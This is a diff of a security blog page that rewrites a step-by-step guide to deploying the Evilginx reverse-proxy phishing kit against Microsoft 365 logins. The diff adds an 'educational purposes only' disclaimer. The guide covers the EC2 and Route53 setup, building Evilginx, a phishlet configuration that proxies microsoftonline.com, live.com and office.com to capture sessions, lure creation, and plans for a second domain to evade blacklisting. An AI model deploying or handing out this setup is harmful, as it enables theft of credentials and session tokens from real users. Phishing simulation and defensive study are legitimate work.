@@ -11,7 +11,7 @@
     <meta charset="utf-8">
 
 <!-- begin _includes/seo.html --><title>Phishing Domain 1 Evilginx - PD @0xd4ngi</title>
-<meta name="description" content="Setting up the domain1">
+<meta name="description" content="Note: This guide is for educational purposes only to understand phishing techniques and improve defense mechanisms.">
 
 
   <meta name="author" content="Prashant Dangi">
@@ -27,7 +27,7 @@
 <meta property="og:url" content="http://localhost:4000/phishing-domain-1-evilginx/">
 
 
-  <meta property="og:description" content="Setting up the domain1">
+  <meta property="og:description" content="Note: This guide is for educational purposes only to understand phishing techniques and improve defense mechanisms.">
 
 
 
@@ -35,7 +35,7 @@
 
   <meta name="twitter:site" content="@0xd4ngi">
   <meta name="twitter:title" content="Phishing Domain 1 Evilginx">
-  <meta name="twitter:description" content="Setting up the domain1">
+  <meta name="twitter:description" content="Note: This guide is for educational purposes only to understand phishing techniques and improve defense mechanisms.">
   <meta name="twitter:url" content="http://localhost:4000/phishing-domain-1-evilginx/">
 
   
@@ -286,7 +286,7 @@
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
     <meta itemprop="headline" content="Phishing Domain 1 Evilginx">
-    <meta itemprop="description" content="Setting up the domain1">
+    <meta itemprop="description" content="  Note: This guide is for educational purposes only to understand phishing techniques and improve defense mechanisms.">
     <meta itemprop="datePublished" content="2024-01-14T00:00:00+05:30">
     
 
@@ -326,54 +326,89 @@
           <aside class="sidebar__right sticky">
             <nav class="toc">
               <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
-              <ul class="toc__menu"><li><a href="#setting-up-the-domain1">Setting up the domain1</a></li><li><a href="#setting-up-the-nameservers--route53">Setting up the nameservers ~ Route53</a></li><li><a href="#setting-up-the-vps--ec2">Setting up the VPS ~ EC2</a><ul><li><a href="#network-settings">Network Settings</a></li></ul></li><li><a href="#setting-up-evilginx-in-instance">setting up evilginx in instance</a></li><li><a href="#phishlets-in-my-case-is-m365">phishlets in my case is m365</a></li><li><a href="#pointing-subdomains-of-domain-1-to-phishlets-subdomain">pointing subdomains of domain 1 to phishlets subdomain</a></li><li><a href="#creating-lures-in-evilginx">creating lures in evilginx</a></li></ul>
+              <ul class="toc__menu"><li><a href="#setting-up-the-domain">Setting up the Domain</a></li><li><a href="#setting-up-the-nameservers-with-route53">Setting up the Nameservers with Route53</a></li><li><a href="#setting-up-the-vps-with-ec2">Setting up the VPS with EC2</a></li><li><a href="#installing-and-configuring-evilginx">Installing and Configuring Evilginx</a></li><li><a href="#configuring-the-m365-phishlet">Configuring the M365 Phishlet</a></li><li><a href="#dns-configuration">DNS Configuration</a></li><li><a href="#creating-lures">Creating Lures</a></li><li><a href="#additional-security-measures">Additional Security Measures</a></li></ul>
             </nav>
           </aside>
         
-        <h3 id="setting-up-the-domain1">Setting up the domain1</h3>
+        <blockquote>
+  <p><strong>Note</strong>: This guide is for educational purposes only to understand phishing techniques and improve defense mechanisms.</p>
+</blockquote>
 
-<h3 id="setting-up-the-nameservers--route53">Setting up the nameservers ~ Route53</h3>
+<h3 id="setting-up-the-domain">Setting up the Domain</h3>
 
-<h3 id="setting-up-the-vps--ec2">Setting up the VPS ~ EC2</h3>
-<p>Ubuntu free tier <br />
-Generate ssh key pair</p>
-<h4 id="network-settings">Network Settings</h4>
-<p>configuring the ssh to local computer ip</p>
+<p>This post continues our series on understanding phishing infrastructure. We’ll cover setting up a domain on AWS EC2 and configuring phishlets.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://ipinfo.io/ip 
-</code></pre></div></div>
-<p>and http/s and DNS from 0.0.0.0 (anywhere) ~~&gt; Launch</p>
+<h3 id="setting-up-the-nameservers-with-route53">Setting up the Nameservers with Route53</h3>
 
-<h3 id="setting-up-evilginx-in-instance">setting up <a href="https://github.com/kgretzky/evilginx2">evilginx</a> in instance</h3>
+<ol>
+  <li>Create a hosted zone in Route53</li>
+  <li>Configure nameservers for your domain</li>
+</ol>
+
+<h3 id="setting-up-the-vps-with-ec2">Setting up the VPS with EC2</h3>
+
+<ol>
+  <li>Launch an Ubuntu free-tier instance</li>
+  <li>Generate SSH key pair</li>
+  <li>Configure network settings:
+    <ul>
+      <li>Allow SSH from your IP only:
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get your public IP</span>
+curl http://ipinfo.io/ip 
+</code></pre></div>        </div>
+      </li>
+      <li>Allow HTTP/HTTPS (port 80/443) from anywhere</li>
+      <li>Allow DNS (port 53) from anywhere</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="installing-and-configuring-evilginx">Installing and Configuring Evilginx</h3>
+
+<ol>
+  <li>Install Go:</li>
+</ol>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
-<span class="c">#INSATLLING GO</span>
 <span class="nb">cd</span> ~
 curl <span class="nt">-OL</span> https://golang.org/dl/go1.21.6.linux-amd64.tar.gz
 <span class="nb">sha256sum </span>go1.21.6.linux-amd64.tar.gz
 <span class="nb">sudo tar</span> <span class="nt">-C</span> /usr/local <span class="nt">-xvf</span> go1.21.6.linux-amd64.tar.gz
-<span class="nb">sudo </span>nano ~/.profile
-<span class="c">### adding this</span>
-<span class="c">## export PATH=$PATH:/usr/local/go/bin</span>
+
+<span class="c"># Add Go to PATH</span>
+<span class="nb">echo</span> <span class="s2">"export PATH=</span><span class="se">\$</span><span class="s2">PATH:/usr/local/go/bin"</span> <span class="o">&gt;&gt;</span> ~/.profile
 <span class="nb">source</span> ~/.profile
 go version
+</code></pre></div></div>
 
-git clone https://github.com/kgretzky/evilginx2.git
+<ol>
+  <li>Install Evilginx:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/kgretzky/evilginx2.git
 <span class="nb">cd </span>evilginx2
 make
 <span class="nb">sudo</span> ./build/evilginx <span class="nt">-p</span> /phishlets/
+</code></pre></div>    </div>
+  </li>
+  <li>Basic Evilginx commands:</li>
+</ol>
 
-<span class="c">## help ~~ ## config domain 1 ~~ ## config ipv4</span>
-<span class="c">### domain pointing to instance public ip</span>
-<span class="c">## setting up the phishlets</span>
-<span class="c">## phishlets hostname m365 domain1</span>
-<span class="c">## phishlets enable m365</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># View help</span>
+<span class="nb">help</span>
+
+<span class="c"># Configure domain</span>
+config domain yourdomain.com
+
+<span class="c"># Configure instance IP</span>
+config ipv4 your.instance.ip
 </code></pre></div></div>
-<h3 id="phishlets-in-my-case-is-m365">phishlets in my case is m365</h3>
+
+<h3 id="configuring-the-m365-phishlet">Configuring the M365 Phishlet</h3>
+
+<p>Create a phishlet configuration file:</p>
 
 <div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">min_ver</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3.2.0'</span>
 <span class="na">proxy_hosts</span><span class="pi">:</span>
-  <span class="pi">-</span> <span class="pi">{</span><span class="nv">phish_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">orig_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">microsoftonline.com'</span><span class="pi">,</span> <span class="nv">session</span><span class="pi">:</span><span class="nv">true</span><span class="pi">,</span> <span class="nv">is_landing</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">}</span>
+  <span class="pi">-</span> <span class="pi">{</span><span class="nv">phish_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">orig_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">microsoftonline.com'</span><span class="pi">,</span> <span class="nv">session</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">,</span> <span class="nv">is_landing</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">}</span>
   <span class="pi">-</span> <span class="pi">{</span><span class="nv">phish_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">logon'</span><span class="pi">,</span> <span class="nv">orig_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">login'</span><span class="pi">,</span> <span class="nv">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">live.com'</span><span class="pi">,</span> <span class="nv">session</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">,</span> <span class="nv">is_landing</span><span class="pi">:</span> <span class="nv">false</span><span class="pi">}</span>
   <span class="pi">-</span> <span class="pi">{</span><span class="nv">phish_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">www'</span><span class="pi">,</span> <span class="nv">orig_sub</span><span class="pi">:</span> <span class="s1">'</span><span class="s">www'</span><span class="pi">,</span> <span class="nv">domain</span><span class="pi">:</span> <span class="s1">'</span><span class="s">office.com'</span><span class="pi">,</span> <span class="nv">session</span><span class="pi">:</span> <span class="nv">true</span><span class="pi">,</span> <span class="nv">is_landing</span><span class="pi">:</span> <span class="nv">false</span><span class="pi">}</span>
 <span class="na">sub_filters</span><span class="pi">:</span>
@@ -418,23 +453,30 @@ make
   <span class="na">path</span><span class="pi">:</span> <span class="s1">'</span><span class="s">/'</span> <span class="c1"># path to where the login is, on the domain.    </span>
 </code></pre></div></div>
 
-<h3 id="pointing-subdomains-of-domain-1-to-phishlets-subdomain">pointing subdomains of domain 1 to phishlets subdomain</h3>
+<h3 id="dns-configuration">DNS Configuration</h3>
 
-<p>login <br />
-logon and <br />
-www ~~&gt; to the domain1 ip that is the instance ip running the server</p>
+<p>Point these subdomains to your instance IP:</p>
+<ul>
+  <li>login.yourdomain.com</li>
+  <li>logon.yourdomain.com</li>
+  <li>www.yourdomain.com</li>
+</ul>
 
-<h3 id="creating-lures-in-evilginx">creating lures in evilginx</h3>
+<h3 id="creating-lures">Creating Lures</h3>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">## in evilginx</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create a lure for M365</span>
 lures create m365
+
+<span class="c"># Get the phishing URL</span>
 lures get-url &lt;<span class="nb">id</span><span class="o">&gt;</span>
 </code></pre></div></div>
-<h2 id="adding-another-domain-to-prevent-blacklisting">Adding another domain to prevent BLACKLISTING</h2>
 
-<p>Adding another apache server</p>
+<h3 id="additional-security-measures">Additional Security Measures</h3>
 
-<p>Next part in domain 2</p>
+<p>To prevent blacklisting, we’ll set up a secondary domain with Apache in the next part of this series.</p>
+
+<hr />
+
 
         
       </section>
@@ -466,11 +508,11 @@ lures get-url &lt;<span class="nb">id</span><span class="o">&gt;</span>
       
   <nav class="pagination">
     
-      <a href="/reverse-web-proxy-phishing/" class="pagination--pager" title="Reverse Web Proxy Phishing
+      <a href="/security%20testing/web%20security/reverse-web-proxy-phishing/" class="pagination--pager" title="EVILGINX: Advanced Reverse Web Proxy for Security Testing
 ">Previous</a>
     
     
-      <a href="/API-Testing/" class="pagination--pager" title="Hacking API’s by @corey j. ball
+      <a href="/API-Testing/" class="pagination--pager" title="Understanding API Security and Testing
 ">Next</a>
     
   </nav>
@@ -539,6 +581,47 @@ lures get-url &lt;<span class="nb">id</span><span class="o">&gt;</span>
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
+        <a href="/risc-v/RISC-V/" rel="permalink">RISC-V Architecture - From Basics to Building a Simple OS
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">A deep dive into RISC-V architecture, its implementation, and building a minimal operating system
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
         <a href="/binary-exploitation/virtual-memory-layout/" rel="permalink">Buffer Overflows and The Virtual memory layout
 </a>
       
@@ -580,7 +663,7 @@ lures get-url &lt;<span class="nb">id</span><span class="o">&gt;</span>
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/llm/" rel="permalink">Understanding Large Language models(LLMs)
+        <a href="/llm/ai/llm/" rel="permalink">Understanding Large Language models(LLMs)
 </a>
       
     </h2>
@@ -606,47 +689,6 @@ lures get-url &lt;<span class="nb">id</span><span class="o">&gt;</span>
 
 
     <p class="archive__item-excerpt" itemprop="description">“Machine Learning Models that use deep learning to perform Natural Language Processing(NLP) tasks”
-</p>
-  </article>
-</div>
-
-    
-      
-      
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/rag/" rel="permalink">Retrieval Augmented Generation(RAG) is a threat to AI
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-
-    
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
-        
-          1 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">Some concern and risks associated with RAG that could perceived as threats, in areas related to AI safety and misuse
 </p>
   </article>
 </div>
